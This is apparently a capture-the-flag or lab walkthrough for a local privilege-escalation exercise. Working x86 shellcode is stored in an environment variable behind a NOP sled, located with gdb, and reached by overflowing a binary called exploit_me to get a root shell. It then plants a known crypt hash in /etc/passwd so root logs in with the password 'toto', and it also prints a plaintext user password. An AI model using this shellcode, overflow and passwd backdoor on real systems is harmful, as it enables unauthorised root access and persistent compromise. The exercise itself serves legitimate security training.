There are multiple methods to exploit a binary, we can use a shellcode stored in an environment variable and execute it using the EIP.

# su zaz
password: 646da671ca01bb5d84dbb5fb2238dc8e
# env -i exploit=$(python -c 'print "\x90"*1000+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') gdb exploit_me
(gdb) b main
(gdb) r
(gdb) x/200xs environ
-> 0xbffffb9c:      "exploit=\220..."
(gdb) x/200xg 0xbffffb9c
random address from the nopsled -> 0xbffffd6c
# env -i exploit=$(python -c 'print "\x90"*1000+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') ./exploit_me $(python -c 'print "A"*140 + "\x6c\xfd\xff\xbf"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAl
# whoami
root

But we're not id 0 yet
vim /etc/passwd
    root:x:0:0:aaaaaa:/root:/bin/bash
replace x with:
    firwVQs3fu3rM
It's the hashed version of "toto" with the C function "crypt" and the key "firefart"
Save and quit with :wq!
And now you can log in as root with the password toto
    su root -
